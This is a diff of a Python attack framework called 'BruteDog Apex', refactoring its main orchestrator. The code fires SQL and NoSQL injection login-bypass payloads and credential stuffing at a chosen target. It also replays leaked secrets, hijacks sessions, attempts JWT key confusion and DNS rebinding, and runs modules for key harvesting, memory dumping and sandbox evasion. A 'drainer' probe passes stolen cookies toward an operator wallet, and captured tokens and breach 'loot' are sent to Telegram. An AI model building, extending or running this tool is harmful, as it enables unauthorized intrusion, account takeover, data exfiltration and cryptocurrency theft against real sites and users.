@@ -8,14 +8,14 @@ Features:
 - Zero-noise high-value loot verification with direct Telegram telemetry broadcasting.
 """
 import asyncio
+import hashlib
+import inspect
 import json
 import re
 import socket
 import sys
 import time
-import hashlib
-from urllib.parse import urlsplit
-from concurrent.futures import ThreadPoolExecutor
+from urllib.parse import urlsplit, urlunsplit
 
 # ============================================================
 # COMPREHENSIVE MODULE INVENTORY & OFFENSIVE IMPORTS (V8.8)
@@ -87,7 +87,7 @@ FALLBACK_LOGIN_PATHS = [
     "/api/v1/user/profile",
     "/api/settings",
     "/graphql",
-    "/api/v1/graphql"
+    "/api/v1/graphql",
 ]
 
 SESSION_VERIFICATION_ENDPOINTS = [
@@ -97,7 +97,7 @@ SESSION_VERIFICATION_ENDPOINTS = [
     "/api/v1/auth/session",
     "/api/account",
     "/dashboard",
-    "/admin"
+    "/admin",
 ]
 
 HEURISTIC_SIGNATURES = {
@@ -107,6 +107,16 @@ HEURISTIC_SIGNATURES = {
     "MongoDB error": re.compile(r"mongodb|mongosh|mongoerror|bsonerror|casttoobjectid", re.I),
     "JWT Token Leak": re.compile(r"eyJ[a-zA-Z0-9_-]{10,}\.eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}", re.I),
 }
+
+SPA_SHELL_MARKERS = (
+    '<div id="root"></div>',
+    '<div id="__next"></div>',
+    '<div id="app"></div>',
+    '<div id="__nuxt"></div>',
+    '<meta name="viewport"',
+    "<!doctype html>",
+    "<html",
+)
 
 # ============================================================
 # OUTPUT COLORS & FORMATTING
@@ -119,61 +129,113 @@ RESET = "\033[0m"
 BOLD = "\033[1m"
 MAGENTA = "\033[95m"
 
+
 def info(message):
     sys.stdout.write(f"{CYAN}[*] {message}{RESET}\n")
     sys.stdout.flush()
+
 
 def success(message):
     sys.stdout.write(f"{GREEN}[+] {message}{RESET}\n")
     sys.stdout.flush()
 
+
 def warning(message):
     sys.stdout.write(f"{YELLOW}[!] {message}{RESET}\n")
     sys.stdout.flush()
+
 
 def error(message):
     sys.stdout.write(f"{RED}[-] {message}{RESET}\n")
     sys.stdout.flush()
 
+
 def section(title):
     sys.stdout.write(f"\n" + "=" * 65 + f"\n {title}\n" + "=" * 65 + "\n")
     sys.stdout.flush()
+
 
 def dispatch_critical_loot_alert(loot_type, details):
     """Zero-noise dispatcher: Fires Telegram alerts ONLY for verified, high-value exploit loot."""
     try:
         loop = asyncio.get_running_loop()
-        loop.create_task(send_telegram_alert(f"[APEX BREACH] {loot_type}", details))
+        if not loop.is_closed():
+            loop.create_task(send_telegram_alert(f"[APEX BREACH] {loot_type}", details))
     except RuntimeError:
         try:
             asyncio.run(send_telegram_alert(f"[APEX BREACH] {loot_type}", details))
         except Exception:
             pass
 
+
+async def invoke_module(func, *args, **kwargs):
+    """Safely invokes sync, async, or awaitable-returning functions without crashing on None."""
+    if not callable(func):
+        return None
+    if asyncio.iscoroutinefunction(func):
+        result = await func(*args, **kwargs)
+    else:
+        result = await asyncio.to_thread(func, *args, **kwargs)
+    if inspect.isawaitable(result):
+        return await result
+    return result
+
+
 # ============================================================
-# TARGET HANDLING & NORMALIZATION
+# TARGET HANDLING & NORMALIZATION (DUPLICATE PORT FIX)
 # ============================================================
+def normalize_target_url(raw_target: str) -> str:
+    cleaned = (raw_target or "").strip()
+    if not cleaned:
+        raise ValueError("Target cannot be empty.")
+
+    # Repair accidental duplicate port patterns like `:443:443` or `:80:80`
+    cleaned = re.sub(r"(:\d+):\d+(?=/|$|\?|#)", r"\1", cleaned)
+
+    if "://" not in cleaned:
+        cleaned = "https://" + cleaned
+
+    parsed = urlsplit(cleaned)
+    scheme = (parsed.scheme or "https").lower()
+    host = (parsed.hostname or "").lower()
+    if not host:
+        raise ValueError(f"Could not parse valid hostname from target: {raw_target}")
+
+    # Handle IPv6 brackets cleanly
+    formatted_host = f"[{host}]" if ":" in host and not host.startswith("[") else host
+
+    try:
+        port = parsed.port
+    except ValueError:
+        # Fallback if malformed port string remained
+        port = None
+
+    if port is not None and not ((scheme == "https" and port == 443) or (scheme == "http" and port == 80)):
+        netloc = f"{formatted_host}:{port}"
+    else:
+        netloc = formatted_host
+
+    path = re.sub(r"/{2,}", "/", parsed.path or "")
+    normalized = urlunsplit((scheme, netloc, path, parsed.query, parsed.fragment)).rstrip("/")
+    return normalized
+
+
+def sanitize_endpoint_url(base_url: str, path: str) -> str:
+    clean_base = normalize_target_url(base_url)
+    clean_path = (path or "").strip()
+    if clean_path.startswith("http://") or clean_path.startswith("https://"):
+        return normalize_target_url(clean_path)
+    clean_path = re.sub(r"^/+(?=\d+:)", "", clean_path)
+    if not clean_path.startswith("/"):
+        clean_path = "/" + clean_path
+    return f"{clean_base}{clean_path}"
+
+
 def get_target():
     section("BRUTEDOG APEX TARGET CONFIGURATION")
     target = input("\nTarget Domain/URL: ").strip()
-    if not target:
-        raise ValueError("Target cannot be empty.")
-    if "://" not in target:
-        target = "https://" + target
-    
-    parsed = urlsplit(target)
-    scheme = parsed.scheme
-    netloc = parsed.hostname
-    port = parsed.port
-    path = parsed.path
-    query = f"?{parsed.query}" if parsed.query else ""
-    fragment = f"#{parsed.fragment}" if parsed.fragment else ""
-    
-    if port:
-        if not ((scheme == "https" and port == 443) or (scheme == "http" and port == 80)):
-            netloc = f"{netloc}:{port}"
-            
-    return f"{scheme}://{netloc}{path}{query}{fragment}".rstrip("/")
+    return normalize_target_url(target)
+
 
 def resolve_target(host):
     try:
@@ -182,26 +244,84 @@ def resolve_target(host):
     except socket.gaierror:
         return []
 
+
 # ============================================================
-# APEX COGNITIVE REFLEX & TACTICAL ADAPTATION ENGINE
+# SPA / SOFT-200 FILTER & COGNITIVE HEURISTIC ENGINE
 # ============================================================
-async def evaluate_response_heuristics(status, headers, body, endpoint, transport, target_url, cognitive_brain):
+def is_generic_spa_or_html_shell(body: str, headers: dict) -> bool:
+    """Detects generic HTML/SPA shells that return HTTP 200 without real API/auth/session data."""
+    text = body or ""
+    lower = text.lower()
+    content_type = ""
+    if isinstance(headers, dict):
+        for k, v in headers.items():
+            if str(k).lower() == "content-type":
+                content_type = str(v).lower()
+                break
+
+    if "application/json" in content_type or "application/problem+json" in content_type:
+        return False
+
+    has_html_marker = any(marker in lower for marker in SPA_SHELL_MARKERS)
+    has_auth_or_data_marker = any(
+        token in lower
+        for token in (
+            '"access_token"',
+            '"auth_token"',
+            '"session_id"',
+            '"token"',
+            '"role":"admin"',
+            '"user_id"',
+            '"permissions"',
+            "bearer ",
+        )
+    )
+
+    if has_html_marker and not has_auth_or_data_marker:
+        return True
+
+    stripped = text.strip()
+    if len(stripped) < 250 and "token" not in lower and "session" not in lower and "user" not in lower:
+        return True
+
+    return False
+
+
+async def evaluate_response_heuristics(
+    status,
+    headers,
+    body,
+    endpoint,
+    transport,
+    target_url,
+    cognitive_brain,
+    fingerprinter=None,
+):
     """
-    Sub-millisecond heuristic evaluation engine. Profiles WAFs, detects tokens/JWTs,
-    triggers instant module pivots, and logs verified breach evidence.
+    Sub-millisecond heuristic evaluation engine. Profiles WAFs, filters soft-200 HTML/SPA shells,
+    detects tokens/JWTs, triggers instant module pivots, and logs verified breach evidence.
     """
     findings = []
     mutated_payloads = []
-    body_lower = (body or "").lower()
-    header_str = str(headers).lower()
+    body_text = body or ""
+    body_lower = body_text.lower()
+    header_str = str(headers or "").lower()
+
+    if fingerprinter is not None:
+        try:
+            is_fp, _ = fingerprinter.is_false_positive(status, body_text, headers or {})
+            if is_fp:
+                return [], []
+        except Exception:
+            pass
 
     # 1. Sub-millisecond WAF & Defense Profiling
     for waf_name, pattern in HEURISTIC_SIGNATURES.items():
-        if waf_name in ["Cloudflare WAF", "AWS API Gateway"]:
+        if waf_name in ("Cloudflare WAF", "AWS API Gateway"):
             if pattern.search(header_str) or pattern.search(body_lower):
                 info(f"[TACTICAL REFLEX] Defense profile matched: {waf_name}. Adjusting evasion headers & jitter.")
         elif waf_name == "JWT Token Leak":
-            jwt_matches = pattern.findall(body)
+            jwt_matches = pattern.findall(body_text)
             if jwt_matches:
                 success(f"[LOOT REFLEX] Unredacted JWT token harvested from {endpoint}!")
                 dispatch_critical_loot_alert("JWT Token Leak", {"endpoint": endpoint, "token": jwt_matches[0][:30] + "..."})
@@ -210,15 +330,16 @@ async def evaluate_response_heuristics(status, headers, body, endpoint, transpor
     # 2. Cognitive Brain Feedback Integration
     if cognitive_brain:
         try:
-            cognitive_result = cognitive_brain.evaluate_and_execute(
+            cognitive_result = await invoke_module(
+                cognitive_brain.evaluate_and_execute,
                 endpoint=endpoint,
                 status=status,
                 headers=headers,
-                body=body,
+                body=body_text,
                 transport=transport,
-                target_url=target_url
+                target_url=target_url,
             )
-            if cognitive_result and cognitive_result.get("success"):
+            if isinstance(cognitive_result, dict) and cognitive_result.get("success"):
                 reasoning = cognitive_result.get("reasoning")
                 success(f"[COGNITIVE PIVOT] Autonomous strike adaptation: {reasoning}")
                 findings.append({"type": "COGNITIVE_PIVOT_SUCCESS", "evidence": reasoning})
@@ -227,82 +348,129 @@ async def evaluate_response_heuristics(status, headers, body, endpoint, transpor
             pass
 
     # 3. SPA Shell Rejection & Authentication Bypass Confirmation
-    is_spa_shell = (
-        '<div id="root"></div>' in body or 
-        '<div id="__next"></div>' in body or 
-        '<div id="app"></div>' in body or
-        '<div id="__nuxt"></div>' in body or
-        "login-form" in body_lower or
-        ("<!doctype html>" in body_lower and len(body.strip()) > 1000 and "json" not in header_str)
+    spa_shell = is_generic_spa_or_html_shell(body_text, headers or {})
+    has_auth_markers = any(
+        k in body_lower
+        for k in [
+            "access_token",
+            "auth_token",
+            "session_id",
+            '"role":"admin"',
+            '"user_id":',
+            "permissions",
+        ]
     )
 
-    has_auth_markers = any(k in body_lower for k in ["access_token", "auth_token", "session_id", "\"role\":\"admin\"", "\"user_id\":", "permissions"])
-    
-    if status in [200, 201, 302] and not is_spa_shell and has_auth_markers:
-        loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()
-        stream_proof("AUTHENTICATION_BYPASS", endpoint, {}, body[:300], {"status": status, "integrity_hash": loot_hash})
-        save_session_loot(
+    if status in (200, 201, 302) and not spa_shell and has_auth_markers:
+        loot_hash = hashlib.sha256(body_text.encode("utf-8", errors="ignore")).hexdigest()
+        await invoke_module(
+            stream_proof,
+            "AUTHENTICATION_BYPASS",
+            endpoint,
+            {},
+            body_text[:300],
+            {"status": status, "integrity_hash": loot_hash},
+        )
+        await invoke_module(
+            save_session_loot,
             target=target_url,
             endpoint=endpoint,
             finding_type="AUTHENTICATION_BYPASS_SUCCESS",
             status=status,
-            headers=dict(headers),
-            body=body,
-            extra_loot={"integrity_hash": loot_hash}
+            headers=dict(headers) if isinstance(headers, dict) else {},
+            body=body_text,
+            extra_loot={"integrity_hash": loot_hash},
         )
         dispatch_critical_loot_alert("Authentication Bypass Success", {"endpoint": endpoint, "status": status})
         findings.append({"type": "AUTHENTICATION_BYPASS_SUCCESS", "status": status})
 
-    # 4. Error-Based Dynamic Mutation Training
-    for label, pattern in HEURISTIC_SIGNATURES.items():
-        if label in ["SQL syntax", "MongoDB error"] and pattern.search(body):
-            warning(f"[HEURISTIC] Database exception detected ({label}) at {endpoint}. Training mutant payloads...")
-            if "MongoDB" in label:
-                mutated_payloads.append({"username": {"$regex": "^admin.*$"}, "password": {"$ne": ""}})
-            elif "SQL" in label:
-                mutated_payloads.append({"username": "admin' UNION SELECT null, version()-- -", "password": "password"})
+    # 4. Error-Based Dynamic Mutation Training (only outside SPA HTML shells)
+    if not spa_shell:
+        for label, pattern in HEURISTIC_SIGNATURES.items():
+            if label in ("SQL syntax", "MongoDB error") and pattern.search(body_text):
+                warning(f"[HEURISTIC] Database exception detected ({label}) at {endpoint}. Training mutant payloads...")
+                if "MongoDB" in label:
+                    mutated_payloads.append({"username": {"$regex": "^admin.*$"}, "password": {"$ne": ""}})
+                elif "SQL" in label:
+                    mutated_payloads.append({"username": "admin' UNION SELECT null, version()-- -", "password": "password"})
 
     return findings, mutated_payloads
 
-async def verify_hijacked_session(transport):
+
+async def verify_hijacked_session(transport, fingerprinter=None):
     for endpoint in SESSION_VERIFICATION_ENDPOINTS:
-        status, headers, body = transport.request("GET", endpoint)
-        if status == 200 and '<div id="root"></div>' not in body and len(body) > 10:
-            loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()
-            stream_proof("SESSION_HIJACK_VERIFIED", endpoint, {"cookie_jar": dict(transport.cookie_jar)}, body[:300], {"status": status})
+        try:
+            req_res = await invoke_module(transport.request, "GET", endpoint)
+            if isinstance(req_res, tuple) and len(req_res) >= 3:
+                status, headers, body = req_res[0], req_res[1], req_res[2]
+            else:
+                continue
+        except Exception:
+            continue
+
+        if fingerprinter is not None:
+            try:
+                is_fp, _ = fingerprinter.is_false_positive(status, body or "", headers or {})
+                if is_fp:
+                    continue
+            except Exception:
+                pass
+
+        if status == 200 and not is_generic_spa_or_html_shell(body or "", headers or {}) and len((body or "").strip()) > 10:
+            loot_hash = hashlib.sha256((body or "").encode("utf-8", errors="ignore")).hexdigest()
+            await invoke_module(
+                stream_proof,
+                "SESSION_HIJACK_VERIFIED",
+                endpoint,
+                {"cookie_jar": dict(getattr(transport, "cookie_jar", {}) or {})},
+                (body or "")[:300],
+                {"status": status},
+            )
             success(f"[+] Active session verified against protected route: {endpoint}")
-            save_session_loot(
-                target=transport.base_path,
+            await invoke_module(
+                save_session_loot,
+                target=getattr(transport, "base_path", "") or "",
                 endpoint=endpoint,
                 finding_type="SESSION_HIJACK_VERIFIED",
                 status=status,
-                headers=dict(headers),
-                body=body,
-                extra_loot={"integrity_hash": loot_hash}
+                headers=dict(headers) if isinstance(headers, dict) else {},
+                body=body or "",
+                extra_loot={"integrity_hash": loot_hash},
             )
             dispatch_critical_loot_alert("Session Hijack Verified", {"endpoint": endpoint, "status": status})
             return True
     return False
 
+
 # ============================================================
 # APEX STRIKE WORKER & MODULE ORCHESTRATOR
 # ============================================================
-async def execute_endpoint_strike(transport, path, credentials_list, leaked_secrets, fingerprinter, target_url, cognitive_brain):
-    endpoint = f"{transport.base_path}{path}" if not path.startswith(transport.base_path) else path
+async def execute_endpoint_strike(
+    transport,
+    path,
+    credentials_list,
+    leaked_secrets,
+    fingerprinter,
+    target_url,
+    cognitive_brain,
+):
+    base_path = getattr(transport, "base_path", "") or ""
+    raw_ep = f"{base_path}{path}" if base_path and not str(path).startswith(base_path) else str(path)
+    endpoint = sanitize_endpoint_url(target_url, raw_ep)
     results = []
-    
+
     test_queue = [
         {"name": "NoSQL Operator Injection", "payload": {"username": {"$ne": None}, "password": {"$ne": None}}},
         {"name": "SQLi Bypass Payload", "payload": {"username": "admin' OR '1'='1", "password": "password"}},
         {"name": "Credential Stuffing Default", "payload": {"username": "admin", "password": "admin123"}},
-        {"name": "Type Confusion Probe", "payload": {"username": {"unexpected": "object"}, "password": "password"}}
+        {"name": "Type Confusion Probe", "payload": {"username": {"unexpected": "object"}, "password": "password"}},
     ]
 
-    if leaked_secrets:
+    if isinstance(leaked_secrets, dict):
         for k, v in leaked_secrets.items():
             test_queue.insert(0, {"name": f"Leaked Secret Replay ({k})", "payload": {k: v, "code": v}})
 
-    if credentials_list and isinstance(credentials_list, list):
+    if isinstance(credentials_list, list):
         for cred in credentials_list:
             if isinstance(cred, dict):
                 test_queue.insert(0, {"name": "Custom Credential Stuffing", "payload": cred})
@@ -310,29 +478,42 @@ async def execute_endpoint_strike(transport, path, credentials_list, leaked_secr
     executed = set()
     while test_queue:
         test_item = test_queue.pop(0)
-        pkey = json.dumps(test_item["payload"], sort_keys=True)
+        pkey = json.dumps(test_item["payload"], sort_keys=True, default=str)
         if pkey in executed:
             continue
         executed.add(pkey)
 
         try:
-            status, headers, body = transport.request("POST", endpoint, payload=test_item["payload"])
+            req_out = await invoke_module(transport.request, "POST", endpoint, payload=test_item["payload"])
+            if isinstance(req_out, tuple) and len(req_out) >= 3:
+                status, headers, body = req_out[0], req_out[1], req_out[2]
+            else:
+                status, headers, body = 0, {}, ""
         except Exception:
             status, headers, body = 0, {}, ""
 
-        if status in [403, 405, 404]:
+        if status in (403, 405, 404):
             try:
-                astatus, aheaders, abody = transport.request("GET", endpoint)
-                if astatus < 400:
-                    status, headers, body = astatus, aheaders, abody
+                alt_out = await invoke_module(transport.request, "GET", endpoint)
+                if isinstance(alt_out, tuple) and len(alt_out) >= 3:
+                    astatus, aheaders, abody = alt_out[0], alt_out[1], alt_out[2]
+                    if 0 < astatus < 400:
+                        status, headers, body = astatus, aheaders, abody
             except Exception:
                 pass
 
-        if status == 0:
+        if not status:
             continue
 
         findings, mutations = await evaluate_response_heuristics(
-            status, headers, body, endpoint, transport, target_url, cognitive_brain
+            status,
+            headers,
+            body,
+            endpoint,
+            transport,
+            target_url,
+            cognitive_brain,
+            fingerprinter=fingerprinter,
         )
 
         if findings:
@@ -343,16 +524,15 @@ async def execute_endpoint_strike(transport, path, credentials_list, leaked_secr
 
     return results
 
+
 # ============================================================
 # MAIN ENGINE ORCHESTRATOR
 # ============================================================
 async def run_autonomous_engine(target_host=None, credentials_list=None, options=None):
     section("BRUTEDOG APEX COGNITIVE STRIKE ENGINE v8.8")
     try:
-        target_url = target_host.strip() if target_host else get_target()
-        if "://" not in target_url:
-            target_url = "https://" + target_url
-
+        raw_target = target_host if target_host else get_target()
+        target_url = normalize_target_url(raw_target)
         parsed = urlsplit(target_url)
         host = parsed.hostname
         secure = parsed.scheme == "https"
@@ -377,8 +557,8 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
 
     section("PORT SCANNING & RECON")
     try:
-        scan_res = await run_port_scanner(host, concurrency=25)
-        if scan_res.get("status") == "COMPLETED":
+        scan_res = await invoke_module(run_port_scanner, host, concurrency=25)
+        if isinstance(scan_res, dict) and scan_res.get("status") == "COMPLETED":
             success(f"Port scan completed. Open ports: {len(scan_res.get('open_ports', []))}")
     except Exception as exc:
         warning(f"Port scanner warning: {exc}")
@@ -388,18 +568,27 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     session_pool = PersistentSessionPool(base_url=target_url, verify_ssl=False, http2=True)
     fingerprinter = ResponseFingerprinter()
 
+    try:
+        baseline_out = await invoke_module(transport.request, "GET", "/brutedog-nonexistent-baseline-404")
+        if isinstance(baseline_out, tuple) and len(baseline_out) >= 3 and hasattr(fingerprinter, "capture_baseline"):
+            fingerprinter.capture_baseline("soft_404", baseline_out[0], baseline_out[2] or "", baseline_out[1] or {})
+    except Exception:
+        pass
+
     section("ATTACK SURFACE MAPPING & CRAWLING")
-    discovered_paths = FALLBACK_LOGIN_PATHS
+    discovered_paths = list(FALLBACK_LOGIN_PATHS)
     leaked_secrets = {}
     bola_routes = []
     session_cookie = None
 
     try:
-        recon = crawl_target(transport)
+        recon = await invoke_module(crawl_target, transport)
         if isinstance(recon, dict):
-            discovered_paths = recon.get("endpoints", []) or FALLBACK_LOGIN_PATHS
-            leaked_secrets = recon.get("leaked_secrets", {})
-            bola_routes = recon.get("bola_vulnerabilities", {})
+            crawled_eps = recon.get("endpoints") or []
+            if crawled_eps:
+                discovered_paths = [sanitize_endpoint_url(target_url, ep) for ep in crawled_eps]
+            leaked_secrets = recon.get("leaked_secrets") or {}
+            bola_routes = recon.get("bola_vulnerabilities") or []
             session_cookie = recon.get("session_cookie")
     except Exception as exc:
         warning(f"Crawler warning: {exc}. Using standard high-value attack surface.")
@@ -408,45 +597,47 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
         success("Injecting harvested session cookie into transport layer.")
         if isinstance(session_cookie, dict):
             for k, v in session_cookie.items():
-                session_pool.cookie_jar.set(k, v)
-        await verify_hijacked_session(transport)
+                try:
+                    session_pool.cookie_jar.set(k, v)
+                except Exception:
+                    pass
+        await verify_hijacked_session(transport, fingerprinter=fingerprinter)
 
     # ==========================================================
     # EXHAUSTIVE OFFENSIVE MODULE ASSAULT (ALL 38+ MODULES)
     # ==========================================================
     section("EXECUTING APEX OFFENSIVE ASSAULT (ALL 38+ MODULES)")
     modules_pipeline = [
-        (run_api_fuzzer, target_url),
-        (execute_brute_force, target_url),
-        (audit_cloud_metadata, target_url),
-        (inspect_dom_sinks, target_url),
-        (execute_memory_dumper, target_url),
-        (harvest_keys, target_url),
-        (execute_pivot_routing, target_url),
-        (replay_and_inject_payloads, target_url),
-        (evade_sandbox,),
-        (execute_stealth_operations, target_url),
-        (audit_referral_logic, target_url),
-        (sign_transaction, target_url)
+        (run_api_fuzzer, (target_url,)),
+        (execute_brute_force, (target_url,)),
+        (audit_cloud_metadata, (target_url,)),
+        (inspect_dom_sinks, (target_url,)),
+        (execute_memory_dumper, (target_url,)),
+        (harvest_keys, (target_url,)),
+        (execute_pivot_routing, (target_url,)),
+        (replay_and_inject_payloads, (target_url,)),
+        (evade_sandbox, ()),
+        (execute_stealth_operations, (target_url,)),
+        (audit_referral_logic, (target_url,)),
+        (sign_transaction, (target_url,)),
     ]
 
-    for mod in modules_pipeline:
-        func = mod[0]
-        args = mod[1:]
+    for func, args in modules_pipeline:
         try:
-            if asyncio.iscoroutinefunction(func):
-                await func(*args) if args else await func()
-            else:
-                await asyncio.to_thread(func, *args) if args else await asyncio.to_thread(func)
+            await invoke_module(func, *args)
         except Exception as exc:
-            warning(f"Module warning ({func.__name__}): {exc}")
+            warning(f"Module warning ({getattr(func, '__name__', str(func))}): {exc}")
 
     # BOLA / State-Skipping Verification
     if bola_routes:
         warning(f"Assaulting {len(bola_routes)} pre-validated BOLA / State-Skipping routes!")
         for route in bola_routes:
-            dispatch_critical_loot_alert("BOLA Route Verified", {"route": route})
-            execute_live_login_verification(target_url=target_url, endpoint=route)
+            clean_route = sanitize_endpoint_url(target_url, route)
+            dispatch_critical_loot_alert("BOLA Route Verified", {"route": clean_route})
+            try:
+                await invoke_module(execute_live_login_verification, target_url=target_url, endpoint=clean_route)
+            except Exception as exc:
+                warning(f"BOLA verification warning on {clean_route}: {exc}")
 
     section("ADAPTIVE ENDPOINT MUTATION & FUZZING ASSAULT")
     all_results = []
@@ -454,8 +645,14 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
 
     async def worker(path):
         async with semaphore:
-            return await asyncio.to_thread(
-                execute_endpoint_strike, transport, path, credentials_list, leaked_secrets, fingerprinter, target_url, cognitive_brain
+            return await execute_endpoint_strike(
+                transport,
+                path,
+                credentials_list,
+                leaked_secrets,
+                fingerprinter,
+                target_url,
+                cognitive_brain,
             )
 
     tasks = [asyncio.create_task(worker(p)) for p in discovered_paths]
@@ -469,27 +666,29 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
 
     # Deep Database, Session Hijacking & Race Condition Exploitation
     try:
-        db_loot = await run_nosql_assault(target_url, port=port, use_ssl=secure)
+        db_loot = await invoke_module(run_nosql_assault, target_url, port=port, use_ssl=secure)
         if db_loot:
             dispatch_critical_loot_alert("Database Assault Breach", {"target": target_url})
     except Exception as exc:
         error(f"Database assault error: {exc}")
 
     try:
-        hijack_loot = await run_session_hijack(target_url, port=port, use_ssl=secure)
-        if hijack_loot:
+        hijack_loot = await invoke_module(run_session_hijack, target_url, port=port, use_ssl=secure)
+        if isinstance(hijack_loot, list):
             for f in hijack_loot:
-                if f.get("status") == "VERIFIED_ACCESS":
-                    execute_live_login_verification(
+                if isinstance(f, dict) and f.get("status") == "VERIFIED_ACCESS":
+                    clean_ep = sanitize_endpoint_url(target_url, f.get("endpoint", "/admin"))
+                    await invoke_module(
+                        execute_live_login_verification,
                         target_url=target_url,
-                        endpoint=f.get("endpoint", "/admin"),
-                        token=f.get("forged_token")
+                        endpoint=clean_ep,
+                        token=f.get("forged_token"),
                     )
     except Exception as exc:
         error(f"Session hijack error: {exc}")
 
     try:
-        await run_race_condition_test(target_url, port=port, use_ssl=secure, session_pool=session_pool)
+        await invoke_module(run_race_condition_test, target_url, port=port, use_ssl=secure, session_pool=session_pool)
     except Exception as exc:
         error(f"Race condition error: {exc}")
 
@@ -497,34 +696,36 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     section("ADVANCED PROTOCOL & CRYPTO ASSAULT SUITE")
     try:
         jwt_eng = JWTKeyConfusionEngine(target_url)
-        jwks_body = jwt_eng.fetch_public_key("/.well-known/jwks.json")
-        j_success, j_token = jwt_eng.verify_and_exploit("/api/admin/settings", jwks_body or "")
-        if j_success:
-            dispatch_critical_loot_alert("JWT Key Confusion Success", {"token": j_token})
+        jwks_body = await invoke_module(jwt_eng.fetch_public_key, "/.well-known/jwks.json")
+        if jwks_body:
+            jwt_res = await invoke_module(jwt_eng.verify_and_exploit, "/api/admin/settings", jwks_body)
+            if isinstance(jwt_res, tuple) and len(jwt_res) >= 2 and jwt_res[0]:
+                dispatch_critical_loot_alert("JWT Key Confusion Success", {"token": jwt_res[1]})
 
         gql_eng = GraphQLIntrospector(target_url)
-        gql_res = gql_eng.run_introspection("/graphql")
+        gql_res = await invoke_module(gql_eng.run_introspection, "/graphql")
         if gql_res:
             dispatch_critical_loot_alert("GraphQL Schema Introspected", gql_res)
 
-        ws_res = await audit_websocket(target_url + "/ws")
+        ws_res = await invoke_module(audit_websocket, sanitize_endpoint_url(target_url, "/ws"))
         if ws_res:
             dispatch_critical_loot_alert("WebSocket Vulnerability Found", {"target": target_url})
 
         dns_reb = DNSRebindingOrchestrator(target_url)
-        await dns_reb.execute_rebinding_attack(transport)
+        await invoke_module(dns_reb.execute_rebinding_attack, transport)
     except Exception as exc:
         error(f"Crypto/protocol suite error: {exc}")
 
     # Web3 / Liquidity Drainer Audit & Probe
     try:
-        await run_drainer_engine(target_url)
-        evm_dest = OPERATOR_DESTINATIONS.get("ETHEREUM")
-        await asyncio.to_thread(
+        await invoke_module(run_drainer_engine, target_url)
+        evm_dest = OPERATOR_DESTINATIONS.get("ETHEREUM") if isinstance(OPERATOR_DESTINATIONS, dict) else None
+        cookies_dict = dict(getattr(transport, "cookie_jar", {}) or {})
+        await invoke_module(
             execute_probe,
             target_host=target_url,
-            session_cookies=dict(transport.cookie_jar) if isinstance(transport.cookie_jar, dict) else {},
-            target_wallet=evm_dest
+            session_cookies=cookies_dict,
+            target_wallet=evm_dest,
         )
     except Exception as exc:
         error(f"Drainer probe error: {exc}")
@@ -538,6 +739,7 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     success(f"Execution Duration: {duration}s")
     section("APEX MISSION COMPLETE")
     return all_results, duration
+
 
 if __name__ == "__main__":
     try:
